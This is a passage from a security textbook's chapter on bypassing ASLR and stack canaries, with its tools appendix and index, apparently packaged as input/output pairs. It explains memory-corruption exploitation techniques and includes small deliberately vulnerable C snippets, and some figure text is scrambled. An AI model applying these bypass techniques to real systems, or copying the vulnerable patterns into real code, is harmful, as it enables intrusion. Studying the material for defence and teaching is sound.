to execute your ROP chain.\nMemory Information Disclosure Vulnerabilities\nWith the introduction of Address Space Layout Randomization (ASLR), bypass-\ning DEP became more difficult. As its name suggests, the goal of this miti-\ngation method is to randomize the layout of a process’s address space to\nmake it harder for an attacker to predict. Let’s look at a couple of ways that\nan exploit can bypass the protections provided by ASLR.\nBefore ASLR, information disclosure vulnerabilities were typically\nuseful for circumventing an application’s security by allowing access to pro-\ntected information in memory, such as passwords. These types of vulner-\nabilities have found a new use: revealing the layout of the address space to\ncounter randomization by ASLR.\n270 Chapter 10\nFor this kind of exploit, you don’t always need to find a specific memory\ninformation disclosure vulnerability; in some cases, you can create an infor-\nmation disclosure vulnerability from a memory corruption vulnerability.\nLet’s use an example of a heap memory corruption vulnerability. We can\nreliably overwrite an arbitrary number of bytes after a heap allocation, which\ncan in turn be used to disclose the contents of memory using a heap over-\nflow like so: one common structure that might be allocated on the heap is\na buffer containing a length-prefixed string, and when the string buffer is\nallocated, an additional number of bytes is placed at the front to accommo-\ndate a length field. The string data is then stored after the length, as shown\nin Figure 10-10.\nString buffer (9 bytes)\n(cid:31) Vulnerable allocation String length String data Other allocations\n5 bytes \"Hello\"\nReadable data (5 bytes)\nString buffer (9 bytes)\n(cid:30) Overflow String length String data Other allocations\n100 bytes \"Hello\"\nOverflow direction Readable data (100 bytes)\nFigure 10-10: Converting memory corruption to information disclosure\nAt the top is the original pattern of heap allocations . If the vulnerable\nallocation is placed prior to the string buffer in memory, we would have the\nopportunity to corrupt the string buffer. Prior to any corruption occurring,\nwe can only read the 5 valid bytes from the string buffer.\nAt the bottom, we cause the vulnerable allocation to overflow by just\nenough to modify only the length field of the string . We can set the\nlength to an arbitrary value, in this case, 100 bytes. Now when we read\nback the string, we’ll get back 100 bytes instead of only the 5 bytes that\nwere originally allocated. Because the string buffer’s allocation is not that\nlarge, data from other allocations would be returned, which could include\nsensitive memory addresses, such as VTable pointers and heap allocation\npointers. This disclosure gives you enough information to bypass ASLR.\nExploiting ASLR Implementation Flaws\nThe implementation of ASLR is never perfect due to limitations of per-\nformance and available memory. These shortcomings lead to various\nimplementation-specific flaws, which you can also use to disclose the ran-\ndomized memory locations.\nMost commonly, the location of an executable in ASLR isn’t always\nrandomized between two separate processes, which would result in a\nFinding and Exploiting Security Vulnerabilities 271\nvulnerability that could disclose the location of memory from one connec-\ntion to a networked application, even if that might cause that particular\nprocess to crash. The memory address could then be used in a subsequent\nexploit.\nOn Unix-like systems, such as Linux, this lack of randomization should\nonly occur if the process being exploited is forked from an existing master\nprocess. When a process forks, the OS creates an identical copy of the origi-\nnal process, including all loaded executable code. It’s fairly common for\nservers, such as Apache, to use a forking model to service new connections.\nA master process will listen on a server socket waiting for new connections,\nand when one is made, a new copy of the current process is forked and the\nconnected socket gets passed to service the connection.\nOn Windows systems, the flaw manifests in a different way. Windows\ndoesn’t really support forking processes, although once a specific execut-\nable file load address has been randomized, it will always be loaded to\nthat same address until the system is rebooted. If this wasn’t done, the OS\nwouldn’t be able to share read-only memory between processes, resulting\nin increased memory usage.\nFrom a security perspective, the result is that if you can leak a location\nof an executable once, the memory locations will stay the same until the\nsystem is rebooted. You can use this to your advantage because you can leak\nthe location from one execution (even if it causes the process to crash) and\nthen use that address for the final exploit.\nBypassing ASLR Using Partial Overwrites\nAnother way to circumvent ASLR is to use partial overwrites. Because\nmemory tends to be split into distinct pages, such as 4096 bytes, operat-\ning systems restrict how random layout memory and executable code can\nload. For example, Windows does memory allocations on 64KB boundar-\nies. This leads to an interesting weakness in that the lower bits of random\nmemory pointers can be predictable even if the upper bits are totally\nrandom.\nThe lack of randomization in the lower bits might not sound like much\nof an issue, because you would still need to guess the upper bits of the\naddress if you’re overwriting a pointer in memory. Actually, it does allow\nyou to selectively overwrite part of the pointer value when running on a\nlittle endian architecture due to the way that pointer values are stored in\nmemory.\nThe majority of processor architectures in use today are little endian\n(I discussed endianness in more detail in “Binary Endian” on page 41).\nThe most important detail to know about little endian for partial overwrites\nis that the lower bits of a value are stored at a lower address. Memory cor-\nruptions, such as stack or heap overflows, typically write from a low to a\n272 Chapter 10"
  },
  {
    "input": "Detecting Stack Overflows with Memory Canaries",
    "output": "high address. Therefore, if you can control the length of the overwrite, it\nwould be possible to selectively overwrite only the predictable lower bits\nbut not the randomized higher bits. You can then use the partial overwrite\nto convert a pointer to address another memory location, such as a ROP\ngadget. Figure 10-11 shows how to change a memory pointer using a partial\noverwrite.\n0x07060504\nBuffer 04 05 06 07\n0x0706BBAA\nBuffer AA BB 06 07\nOverflow direction\nFigure 10-11: An example of a short overwrite\nWe start with an address of 0x07060504. We know that, due to ASLR,\nthe top 16 bits (the 0x0706 part) are randomized, but the lower 16 bits\nare not. If we know what memory the pointer is referencing, we can selec-\ntively change the lower bits and accurately specify a location to control.\nIn this example, we overwrite the lower 16 bits to make a new address of\n0x0706BBAA.\nDetecting Stack Overflows with Memory Canaries\nMemory canaries, or cookies, are used to prevent exploitation of a memory\ncorruption vulnerability by detecting the corruption and immediately caus-\ning the application to terminate. You’ll most commonly encounter them\nin reference to stack memory corruption prevention, but canaries are also\nused to protect other types of data structures, such as heap headers or vir-\ntual table pointers.\nA memory canary is a random number generated by an application\nduring startup. The random number is stored in a global memory loca-\ntion so it can be accessed by all code in the application. This random\nnumber is pushed onto the stack when entering a function. Then, when\nthe function is exited, the random value is popped off the stack and\ncompared to the global value. If the global value doesn’t match what was\npopped off the stack, the application assumes the stack memory has been\ncorrupted and terminates the process as quickly as possible. Figure 10-12\nshows how inserting this random number detects danger, like a canary in\na coal mine, helping to prevent the attacker from gaining access to the\nreturn address.\nFinding and Exploiting Security Vulnerabilities 273\nUpper stack frame\nReturn address\nOriginal canary != Current canary\nCrash!\nStack buffer\n274 Chapter 10\nnoitcerid\nwolfrevO\nUpper stack frame\nOverflowed\nstack buffer\n0x12345678\nCheck Stack canary 0xAABBCCDD\nStack buffer\nLocal variables Local variables\nFigure 10-12: A stack overflow with a stack canary\nPlacing the canary below the return address on the stack ensures that\nany overflow corruption that would modify the return address would also\nmodify the canary. As long as the canary value is difficult to guess, the\nattacker can’t gain control over the return address. Before the function\nreturns, it calls code to check whether the stack canary matches what it\nexpects. If there’s a mismatch, the program immediately crashes.\nBypassing Canaries by Corrupting Local Variables\nTypically, stack canaries protect only the return address of the currently\nexecuting function on the stack. However, there are more things on the\nstack that can be exploited than just the buffer that’s being overflowed.\nThere might be pointers to functions, pointers to class objects that have\na virtual function table, or, in some cases, an integer variable that can be\noverwritten that might be enough to exploit the stack overflow.\nIf the stack buffer overflow has a controlled length, it might be possible\nto overwrite these variables without ever corrupting the stack canary. Even\nif the canary is corrupted, it might not matter as long as the variable is used\nbefore the canary is checked. Figure 10-13 shows how attackers might cor-\nrupt local variables without affecting the canary.\nIn this example, we have a function with a function pointer on the stack.\nDue to how the stack memory is laid out, the buffer we’ll overflow is at a lower\naddress than the function pointer f, which is also located on the stack .\nWhen the overflow executes, it corrupts all memory above the buffer,\nincluding the return address and the stack canary . However, before the\ncanary checking code runs (which would terminate the process), the func-\ntion pointer f is used. This means we still get code execution  by calling\nthrough f, and the corruption is never detected.\nReturn address\nShell code at address\n0x12345678\nbuffer[32]\nFinding and Exploiting Security Vulnerabilities 275\nnoitcerid\nwolfrevO\nint DoSomething(const char* str)\n{\nint (*f)(const char*) = ADDR\nchar buffer[32];\nstrcpy(buffer, str); 0x12345678 (cid:29)\nreturn f(buffer); Call f()\n} Stack canary 0x12345678\nf = ADDR f = 0x12345678\n(cid:31) (cid:30)\nbuffer[32]\nFigure 10-13: Corrupting local variables without setting off the stack canary\nThere are many ways in which modern compilers can protect against\ncorrupting local variables, including reordering variables so buffers are\nalways above any single variable, which when corrupted, could be used to\nexploit the vulnerability.\nBypassing Canaries with Stack Buffer Underflow\nFor performance reasons, not every function will place a canary on the stack.\nIf the function doesn’t manipulate a memory buffer on the stack, the com-\npiler might consider it safe and not emit the instructions necessary to add the\ncanary. In most cases, this is the correct thing to do. However, some vulner-\nabilities overflow a stack buffer in unusual ways: for example, the vulnerabil-\nity might cause an underflow instead of an overflow, corrupting data lower in\nthe stack. Figure 10-14 shows an example of this kind of vulnerability.\nFigure 10-14 illustrates three steps. First, the function DoSomething() is\ncalled . This function sets up a buffer on the stack. The compiler deter-\nmines that this buffer needs to be protected, so it generates a stack canary\nto prevent an overflow from overwriting the return address of DoSomething().\nSecond, the function calls the Process() method, passing a pointer to the\nbuffer it set up. This is where the memory corruption occurs. However,\ninstead of overflowing the buffer, Process() writes to a value below, for\nexample, by referencing p[-1] . This results in corruption of the return\naddress of the Process() method’s stack frame that has stack canary protec-\ntion. Third, Process() returns to the corrupted return address, resulting in\nshell code execution ."
  },
  {
    "input": "Final Words",
    "output": "Return address\nbuffer[32]\nShell code at address\n0x12345678\n276 Chapter 10\nOverflow\ndirection\nvoid DoSomething() {\nint buffer[32];\nUpper stack frame\nUpper stack frame\nProcess(buffer);\n} (cid:31)\nReturn address\nStack canary Stack frame Stack canary\nbuffer[32]\n(cid:29)\nReturn\nReturn address buffer[−1]: 0x12345678\nStack frame\nvoid Process(int* p)\n{\np[—1] = 0x12345678;\n} (cid:30)\nFigure 10-14: Stack buffer underflow\nFinal words\nFinding and exploiting vulnerabilities in a network application can be dif-\nficult, but this chapter introduced some techniques you can use. I described\nhow to triage vulnerabilities to determine the root cause using a debugger;\nwith the knowledge of the root cause, you can proceed to exploit the vul-\nnerability. I also provided examples of writing simple shell code and then\ndeveloping a payload using ROP to bypass a common exploit mitigation\nDEP. Finally, I described some other common exploit mitigations on mod-\nern operating systems, such as ASLR and memory canaries, and the tech-\nniques to circumvent these mitigations.\nThis is the final chapter in this book. At this point you should be\narmed with the knowledge of how to capture, analyze, reverse engineer,\nand exploit networked applications. The best way to improve your skills is\nto find as many network applications and protocols as you can. With experi-\nence, you’ll easily spot common structures and identify patterns of protocol\nbehavior where security vulnerabilities are typically found."
  },
  {
    "input": "Network Protocol Analysis Toolkit",
    "output": "NE T WORK P ROTOCOL\nANALySIS TOOLKIT\nThroughout this book, I’ve demonstrated several tools\nand libraries you can use in network protocol analy-\nsis, but I didn’t discuss many that I use regularly. This\nappendix describes the tools that I’ve found useful\nduring analysis, investigation, and exploitation. Each\ntool is categorized based on its primary use, although\nsome tools would fit several categories."
  },
  {
    "input": "TCPDump and LibPCAP",
    "output": "passive network protocol capture and analysis tools\nAs discussed in Chapter 2, passive network capture refers to listening and\ncapturing packets without disrupting the flow of traffic.\nMicrosoft Message Analyzer\nWebsite http://blogs.technet.com/b/messageanalyzer/\nLicense Commercial; free of charge\nPlatform Windows\nThe Microsoft Message Analyzer is an extensible tool for analyzing network\ntraffic on Windows. The tool includes many parsers for different protocols\nand can be extended with a custom programming language. Many of its\nfeatures are similar to those of Wireshark except Message Analyzer has\nadded support for Windows events.\nTCPDump and LibPCAP\nWebsite http://www.tcpdump.org/; http://www.winpcap.org/ for Windows\nimplementation (WinPcap/WinDump)\n278 Appendix"
  },
  {
    "input": "Wireshark",
    "output": "License BSD License\nPlatforms BSD, Linux, macOS, Solaris, Windows\nThe TCPDump utility installed on many operating systems is the grand father\nof network packet capture tools. You can use it for basic network data analy-\nsis. Its LibPCAP development library allows you to write your own tools to\ncapture traffic and manipulate PCAP files.\nWireshark\nWebsite https://www.wireshark.org/\nLicense GPLv2\nPlatforms BSD, Linux, macOS, Solaris, Windows\nWireshark is the most popular tool for passive packet capture and analysis.\nIts GUI and large library of protocol analysis modules make it more robust\nand easier to use than TCPDump. Wireshark supports almost every well-\nknown capture file format, so even if you capture traffic using a different\ntool, you can use Wireshark to do the analysis. It even includes support for\nanalyzing nontraditional protocols, such as USB or serial port communica-\ntion. Most Wireshark distributions also include tshark, a replacement for\nTCPDump that has most of the features offered in the main Wireshark\nGUI, such as the protocol dissectors. It allows you to view a wider range of\nprotocols on the command line.\nNetwork Protocol Analysis Toolkit 279"
  },
  {
    "input": "Canape ",
    "output": "active network capture and analysis\nTo modify, analyze, and exploit network traffic as discussed in Chapters 2\nand 8, you’ll need to use active network capture techniques. I use the\nfollowing tools on a daily basis when I’m analyzing and testing network\nprotocols.\nCanape\nWebsite https://github.com/ctxis/canape/\nLicense GPLv3\nPlatforms Windows (with .NET 4)\nI developed the Canape tool as a generic network protocol man-in-\nthe-middle testing, analyzing, and exploitation tool with a usable GUI.\nCanape contains tools that allow users to develop protocol parsers, C# and\nIronPython scripted extensions, and different types of man-in-the-middle\nproxies. It’s open source as of version 1.4, so users can contribute to its\ndevelopment.\n280 Appendix"
  },
  {
    "input": "Mallory",
    "output": "Canape Core\nWebsite https://github.com/tyranid/CANAPE.Core/releases/\nLicense GPLv3\nPlatforms .NET Core 1.1 and 2.0 (Linux, macOS, Windows)\nThe Canape Core libraries, a stripped-down fork of the original Canape\ncode base, are designed for use from the command line. In the examples\nthroughout this book, I’ve used Canape Core as the library of choice. It has\nmuch the same power as the original Canape tool while being usable on\nany OS supported by .NET Core instead of only on Windows.\nMallory\nWebsite https://github.com/intrepidusgroup/mallory/\nLicense Python Software Foundation License v2; GPLv3 if using\nthe GUI\nPlatform Linux\nMallory is an extensible man-in-the-middle tool that acts as a network gate-\nway, which makes the process of capturing, analyzing, and modifying traf-\nfic transparent to the application being tested. You can configure Mallory\nNetwork Protocol Analysis Toolkit 281"
  },
  {
    "input": "Nmap",
    "output": "using Python libraries as well as a GUI debugger. You’ll need to configure\na separate Linux VM to use it. Some useful instructions are available at\nhttps://bitbucket.org/IntrepidusGroup/mallory/wiki/Mallory_Minimal_Guide/.\nnetwork connectivity and protocol testing\nIf you’re trying to test an unknown protocol or network device, basic net-\nwork testing can be very useful. The tools listed in this section help you dis-\ncover and connect to exposed network servers on the target device.\nHping\nWebsite http://www.hping.org/\nLicense GPLv2\nPlatforms BSD, Linux, macOS, Windows\nThe Hping tool is similar to the traditional ping utility, but it supports\nmore than just ICMP echo requests. You can also use it to craft custom\nnetwork packets, send them to a target, and display any responses. This\nis a very useful tool to have in your kit.\nNetcat\nWebsite Find the original at http://nc110.sourceforge.net/ and the GNU\nversion at http://netcat.sourceforge.net/\nLicense GPLv2, public domain\nPlatforms BSD, Linux, macOS, Windows\nNetcat is a command line tool that connects to an arbitrary TCP or UDP\nport and allows you to send and receive data. It supports the creation of\nsending or listening sockets and is about as simple as it gets for network\ntesting. Netcat has many variants, which, annoyingly, all use different com-\nmand line options. But they all do pretty much the same thing.\nNmap\nWebsite https://nmap.org/\nLicense GPLv2\nPlatforms BSD, Linux, macOS, Windows\nIf you need to scan the open network interface on a remote system, nothing\nis better than Nmap. It supports many different ways to elicit responses from\nTCP and UDP socket servers, as well as different analysis scripts. It’s invalu-\nable when you’re testing an unknown device.\n282 Appendix"
  },
  {
    "input": "Burp Suite",
    "output": "web application testing\nAlthough this book does not focus heavily on testing web applications, doing\nso is an important part of network protocol analysis. One of the most widely\nused protocols on the internet, HTTP is even used to proxy other protocols,\nsuch as DCE/RPC, to bypass firewalls. Here are some of the tools I use and\nrecommend.\nBurp Suite\nWebsite https://portswigger.net/burp/\nLicense Commercial; limited free version is available\nPlatforms Supported Java platforms (Linux, macOS, Solaris,\nWindows)\nBurp Suite is the gold standard of commercial web application–testing\ntools. Written in Java for maximum cross-platform capability, it provides\nall the features you need for testing web applications, including built-in\nproxies, SSL decryption support, and easy extensibility. The free version\nhas fewer features than the commercial version, so consider buying the\ncommercial version if you plan to use it a lot.\nNetwork Protocol Analysis Toolkit 283"
  },
  {
    "input": "Mitmproxy",
    "output": "Zed Attack Proxy (ZAP)\nWebsite https://www.owasp.org/index.php/ZAP\nLicense Apache License v2\nPlatforms Supported Java platforms (Linux, macOS, Solaris,\nWindows)\nIf Burp Suite’s price is beyond reach, ZAP is a great free option. Developed by\nOWASP, ZAP is written in Java, can be scripted, and can be easily extended\nbecause it’s open source.\nMitmproxy\nWebsite https://mitmproxy.org/\nLicense MIT\nPlatforms Any Python-supported platform, although the program is\nsomewhat limited on Windows\n284 Appendix"
  },
  {
    "input": "American Fuzzy Lop (AFL)",
    "output": "Mitmproxy is a command line–based web application–testing tool written\nin Python. Its many standard features include interception, modification,\nand replay of requests. You can also include it as a separate library within\nyour own applications.\nFuzzing, packet generation, and\nvulnerability exploitation Frameworks\nWhenever you’re developing exploits for and finding new vulnerabilities,\nyou’ll usually need to implement a lot of common functionality. The follow-\ning tools provide a framework, allowing you to reduce the amount of stan-\ndard code and common functionality you need to implement.\nAmerican Fuzzy Lop (AFL)\nWebsite http://lcamtuf.coredump.cx/afl/\nLicense Apache License v2\nPlatforms Linux; some support for other Unix-like platforms\nDon’t let its cute name throw you off. American Fuzzy Lop (AFL) may be\nnamed after a breed of rabbit, but it’s an amazing tool for fuzz testing, espe-\ncially on applications that can be recompiled to include special instrumenta-\ntion. It has an almost magical ability to generate valid inputs for a program\nfrom the smallest of examples.\nNetwork Protocol Analysis Toolkit 285"
  },
  {
    "input": "Metasploit Framework",
    "output": "Kali Linux\nWebsite https://www.kali.org/\nLicenses A range of open source and non-free licenses depending on\nthe packages used\nPlatforms ARM, Intel x86 and x64\nKali is a Linux distribution designed for penetration testing. It comes pre-\ninstalled with Nmap, Wireshark, Burp Suite, and various other tools listed in\nthis appendix. Kali is invaluable for testing and exploiting network protocol\nvulnerabilities, and you can install it natively or run it as a live distribution.\nMetasploit Framework\nWebsite https://github.com/rapid7/metasploit-framework/\nLicense BSD, with some parts under different licenses\nPlatforms BSD, Linux, macOS, Windows\nMetasploit is pretty much the only game in town when you need a generic\nvulnerability exploitation framework, at least if you don’t want to pay\nfor one. Metasploit is open source, is actively updated with new vulner-\nabilities, and will run on almost all platforms, making it useful for testing\nnew devices. Metasploit provides many built-in libraries to perform typical\nexploitation tasks, such as generating and encoding shell code, spawning\nreverse shells, and gaining elevated privileges, allowing you to concentrate\non developing your exploit without having to deal with various implementa-\ntion details.\n286 Appendix"
  },
  {
    "input": "Ettercap",
    "output": "Scapy\nWebsite http://www.secdev.org/projects/scapy/\nLicense GPLv2\nPlatforms Any Python-supported platform, although it works best on\nUnix-like platforms\nScapy is a network packet generation and manipulation library for Python.\nYou can use it to build almost any packet type, from Ethernet packets\nthrough TCP or HTTP packets. You can replay packets to test what a net-\nwork server does when it receives them. This functionality makes it a very\nflexible tool for testing, analysis, or fuzzing of network protocols.\nSulley\nWebsite https://github.com/OpenRCE/sulley/\nLicense GPLv2\nPlatforms Any Python-supported platform\nSulley is a Python-based fuzzing library and framework designed to simplify\ndata representation, transmission, and instrumentation. You can use it to\nfuzz anything from file formats to network protocols.\nnetwork spoofing and redirection\nTo capture network traffic, sometimes you have to redirect that traffic to a lis-\ntening machine. This section lists a few tools that provide ways to implement\nnetwork spoofing and redirection without needing much configuration.\nDNSMasq\nWebsite http://www.thekelleys.org.uk/dnsmasq/doc.html\nLicense GPLv2\nPlatform Linux\nThe DNSMasq tool is designed to quickly set up basic network services, such\nas DNS and DHCP, so you don’t have to hassle with complex service con-\nfiguration. Although DNSMasq isn’t specifically designed for network spoof-\ning, you can repurpose it to redirect a device’s network traffic for capture,\nanalysis, and exploitation.\nEttercap\nWebsite https://ettercap.github.io/ettercap/\nLicense GPLv2\nPlatforms Linux, macOS\nNetwork Protocol Analysis Toolkit 287"
  },
  {
    "input": "Java Decompiler (JD)",
    "output": "Ettercap (discussed in Chapter 4) is a man-in-the-middle tool designed to\nlisten to network traffic between two devices. It allows you to spoof DHCP\nor ARP addresses to redirect a network’s traffic.\nexecutable reverse engineering\nReviewing the source code of an application is often the easiest way to\ndetermine how a network protocol works. However, when you don’t have\naccess to the source code, or the protocol is complex or proprietary, net-\nwork traffic–based analysis is difficult. That’s where reverse engineering\ntools come in. Using these tools, you can disassemble and sometimes\ndecompile an application into a form that you can inspect. This section\nlists several reverse engineering tools that I use. (See the discussion in\nChapter 6 for more details, examples, and explanation.)\nJava Decompiler (JD)\nWebsite http://jd.benow.ca/\nLicense GPLv3\nPlatforms Supported Java platforms (Linux, macOS, Solaris, Windows)\nJava uses a bytecode format with rich metadata, which makes it fairly easy\nto reverse engineer Java bytecode into Java source code using a tool such\nas the Java Decompiler. The Java Decompiler is available with a stand-alone\nGUI as well as plug-ins for the Eclipse IDE.\n288 Appendix"
  },
  {
    "input": "Hopper",
    "output": "IDA Pro\nWebsite https://www.hex-rays.com/\nLicense Commercial; limited free version available\nPlatforms Linux, macOS, Windows\nIDA Pro is the best-known tool for reverse engineering executables. It\ndisassembles and decompiles many different process architectures, and\nit provides an interactive environment to investigate and analyze the disas-\nsembly. Combined with support for custom scripts and plug-ins, IDA Pro\nis the best tool for reverse engineering executables. Although the full pro-\nfessional version is quite expensive, a free version is available for noncom-\nmercial use; however, it is restricted to 32-bit x86 binaries and has other\nlimitations.\nHopper\nWebsite http://www.hopperapp.com/\nLicense Commercial; a limited free trial version is also available\nPlatforms Linux, macOS\nNetwork Protocol Analysis Toolkit 289"
  },
  {
    "input": ".NET Reflector",
    "output": "Hopper is a very capable disassembler and basic decompiler that can more\nthan match many of the features of IDA Pro. Although as of this writing\nHopper doesn’t support the range of processor architectures that IDA Pro\ndoes, it should prove more than sufficient in most situations due to its sup-\nport of x86, x64, and ARM processors. The full commercial version is con-\nsiderably cheaper than IDA Pro, so it’s definitely worth a look.\nILSpy\nWebsite http://ilspy.net/\nLicense MIT\nPlatform Windows (with .NET4)\nILSpy, with its Visual Studio–like environment, is the best supported of the\nfree .NET decompiler tools.\n.NET Reflector\nWebsite https://www.red-gate.com/products/dotnet-development/reflector/\nLicense Commercial\nPlatform Windows\n290 Appendix\nReflector is the original .NET decompiler. It takes a .NET executable or\nlibrary and converts it into C# or Visual Basic source code. Reflector is very\neffective at producing readable source code and allowing simple navigation\nthrough an executable. It’s a great tool to have in your arsenal.\nNetwork Protocol Analysis Toolkit 291"
  },
  {
    "input": "Index\r",
    "output": "INDEx\nSymbols and Numbers address space layout randomization\n(ASLR)\n\\ (backlash), 47, 220\nbypassing with partial overwrites,\n/ (forward slash), 81, 220\n272–273\n- (minus sign), 55\nexploiting implementation flaws in,\n+ (plus sign), 55\n271–272\n7-bit integer, 39–40\nmemory information disclosure\n8-bit integer, 38–39\nvulnerabilities, 270–271\n32-bit system, 263\nAdleman, Leonard, 160\n32-bit value, 40–41\nAdvanced Encryption Standard (AES),\n64-bit system, 263\n133, 150, 152\n64-bit value, 40–41\nAJAX (Asynchronous JavaScript and\n8086 CPU, 114\nXML), 57\nalgorithms\nA complexity of, 224–225\ncryptographic hashing, 164–165\nA5/1 stream cipher, 159\nDiffie–Helman Key Exchange,\nA5/2 stream cipher, 159\n162–164\nABI (application binary interface),\nhash, 165\n123–124, 259–260\nkey-scheduling, 151\nAbstract Syntax Notation 1 (ASN.1),\nmessage digest (MD), 164\n53–54\nMD4, 165\naccept system call, 123\nMD5, 133, 165–167\nacknowledgment (DHCP packet), 72\nRSA, 149, 160–162, 165\nacknowledgment flag (ACK), 41\nsecure hashing algorithm (SHA),\nactive network capture, 20, 280–282.\n164, 202\nSee also passive network\nSHA-1, 133, 165–166\ncapture\nSHA-2, 165\nadd() function, 124\nSHA-3, 168\nADD instruction, 115\nsignature, 146\nadd_longs() method, 198\nasymmetric, 165\nadd_numbers() method, 197\ncryptographic hashing\nAddress Resolution Protocol (ARP),\nalgorithms, 164–165\n6–7, 74–77\nmessage authentication codes,\naddresses, 4\n166–168\n32-bit, 5\nsymmetric, 166\ndestination, 5\nAMD, 114\nMAC, 6–8, 74–77\nAmerican Fuzzy Lop, 285–286\nsource, 5\nAND instruction, 115\naddress sanitizer, 243–244\nantivirus, 23\napplication, 3 Big-O notation, 225\ncontent parsers, 4 binary conversions, 90–92\nnetwork communication, 4 binary protocols. See also protocols\npassive network traffic capture, 11 binary endian, 41–42\nuser interface, 4 bit flags, 41\napplication binary interface (ABI), Booleans, 41\n123–124, 259–260 formats, 53–54\napplication layer, 3 numeric data, 38–41\napt command line utility, 31 strings, 42–46\narbitrary writing of memory, 253–254 variable binary length data, 47–49\nARM architecture, 42, 118 bind system call, 15\nARP poisoning, 74–77 bit flags, 41\nASCII bit format, 38\ncharacter encoding, 42 block ciphers. See also stream ciphers\ncode pages, 44 AES, 150, 152\ncontrol characters, 43 common, 152\nprintable characters, 43 DES, 150–151\ntext-encoding conversions, 229–230 initialization vector, 154\nASLR. See address space layout modes, 152–155\nrandomization (ASLR) cipher block chaining, 153–155\nASN.1 (Abstract Syntax Notation 1), Electronic Code Book, 152\n53–54 Galois Counter, 155\nassembler, 113, 258 padding, 155–156\nassemblies, 138 padding oracle attack, 156–158\nassembly language, 113 Triple DES, 151\nassembly loading, 190–193 Blowfish, 152\nasymmetric key cryptography, 159–164. Booleans, 41, 55\nSee also symmetric key BPF (Berkeley packet filter), 180\ncryptography breakpoints, 135, 137\nprivate key, 160 BSD (Berkeley Sockets Distribution), 15\npublic key, 160 bss data, 120\nRSA algorithm, 160–162 Bubble Sort, 224\nRSA padding, 162 bucket, 225\ntrapdoor functions, 160 buffer overflows\nasymmetric signature algorithms, 165 fixed-length, 211–213\nAsynchronous JavaScript and XML heap, 248–249\n(AJAX), 57 integer, 214–215\nAT&T syntax, 116 stack, 246–248\nattributes (XML), 58 variable-length, 211, 213–214\nauthentication bypass, 209 Burp Suite, 283–284\nauthorization bypass, 209–210 bytes, 38\nautomated code, identifying, 133–134\nC\nB\nC# language, 112, 189, 210\nbackslash (\\), 47, 220 C++ language, 112, 132\nbase class library, 141 ca.crt file, 203\nBase64, 60–61 CALL instruction, 115\nBerkeley packet filter (BPF), 180 Camellia, 152\nBerkeley Sockets Distribution (BSD), 15 Canape Core, 21–22, 25, 103–105,\nBerkeley Sockets model, 15, 121 280–281\nbig endian, 42, 52, 122 Canape.Cli, xxiv, 202\n294 Index\ncanonicalization, 220–221 cipher feedback mode, 159\nca.pfx file, 203 cipher text, 146\ncapture.pcap file, 180 ciphers, 146\ncapturing network traffic block, 150–159\nactive method, 20 stream, 158–159\npassive method, 12–20 substitution, 147\nproxies CJK character sets, 44\nHTTP, 29–35 CLANG C compiler, 243–244\nman-in-the-middle, 20 C language, 112, 123, 132, 210, 212\nport-forwarding, 21–24 Class files, 141\nSOCKS, 24–29 Class.forName() method (Java), 194\nresending captured traffic, 182–183 client certificate (TLS), 175\nsystem call tracing client random (TLS), 173\nDtrace, 17–18 C library, 268\nProcess Monitor tool, 18–19 CLR (common language runtime), 137\nstrace, 16 CMD command, 255\ncarriage return, 56 CMP instruction, 115, 119\ncarry flag, 117 code\nCBC (cipher block chaining), 153–155 error, 262\nCDB (debugger), 236–241 executable. See executable codes\ncdecl, 199 message authentication. See\ncdll, 199 message authentication\nCert Issuer, 200–202 codes (MACs)\nCert Subject, 200–201 pages (ASCII), 44\ncertificate point, 44\nauthority, 170, 202 section, 120\nchain verification, 170–172 collision attacks, 166–168\npinning, 177 collision resistance (hashing\nrevocation list, 171 algorithm), 165\nroot, 170 command injection, 228\nstore, 204 common intermediate language (CIL),\nX.509, 53–54, 169–171, 173 137–138\ncertmgr.msc, 203 common language runtime (CLR), 137\nCFLAGS environment variable, 243 Common Object Request Broker\nchange cipher spec (TLS), 176 Architecture (CORBA), 22\nchar types, 212 compiled languages, 113\ncharacter encoding compilers, 113, 132, 243\nASCII, 43 compression, 20, 108, 217\nUnicode, 44–45 conditional branches, 118–119\ncharacter mapping, 44–45 CONNECT HTTP method, 30\nchat_server.csx script, 187 Connect() method, 185, 192–193\nChatClient.exe (SuperFunkyChat), CONNECT proxy, 32\n80–81, 200 connect system call, 15\nChatProgram namespace (.NET), 190 content layer, 8–10\nChatServer.exe (SuperFunkyChat), 80 content parsers, 4\nchecksum, 93–94, 107 Content-Type values, 57\nChinese characters, 44 control characters (ASCII), 43\nchosen plaintext attack, 162 control flow, 118\nCIL (common intermediate language), control registers, 117\n137–138 Conversations window (Wireshark),\nCipher and Hash algorithm, 202 84–85\ncipher block chaining (CBC), 153–155 cookies, 212, 273–276\nIndex 295\nCORBA (Common Object Request data expansion attack, 217\nBroker Architecture), 22 DataFrame, 108\ncounter mode, 159 datagram, 5\nCPU, 39 datagram socket, 122\n8086, 114 Datagram Transport Layer Security\nassembly language and, 113 (DTLS), 172\nexhaustion attacks, 224–226 data section, 120\ninstruction set architecture, dates, 49–50, 55\n114–116 .ddl extension, 137–138\nregisters, 116–118 debuggers, 111, 134–137, 236–240,\nsigned integers, 39 243–245, 258–259\nx86 architecture, 114–119, 125 debugging, 236–243\ncrashes analyzing crash in, 238–240\ndebugging, 238–240 applications, 236\nexample, 240–243 default or hardcoded\nfinding root cause of, 243–245 credentials, 218\nCreateInstance() method (.NET), 191 shell code, 258–259\ncron jobs, 254 starting, 236–237\ncross-site scripting (XSS), 58 debugging symbols package\nCrypt32.dll, 132 (dSYM), 131\nCryptoAllPermissionCollection.class, 142 DEC instruction, 115\ncryptanalysis, 146 decimal numbers, 55\ncryptography decompilation, 113\nasymmetric key, 159–164 decryption. See also encryption\nconfigurable, 226 asymmetric, 160\nhashing algorithms, 164–165 block cipher, 150\nlibraries, 132 breakpoints, 137\nsymmetric key, 149–159 cipher block chaining, 155, 157–158\nCS register, 116, 118 dealing with obfuscation, 143–144\nctypes library (Python), 195 padding, 155–157\ncurl command line utility, 31 RSA, 161, 165\nTLS, 200–202\nTriple DES, 151\nD\ndefault credentials, 218\nDante, 27 default gateway, 8, 66\ndata defined memory pools, 252–253\ncontrolling flow of, 2 delimited text, 56\nencapsulation, 4–7 denial-of-service, 208\nendianness of, 41 DEP (data execution prevention),\nformatting and encoding, 2 267–268\nimplicit-length, 48–49 DER (Distinguished Encoding\ninbound, 92 Rules), 53\nintegrity, 164 DES (Data Encryption Standard),\nnumeric, 38–41 150–151\npadded, 49 DES cracker, 151\nterminated, 47–48 destination address, 5\ntransmission, 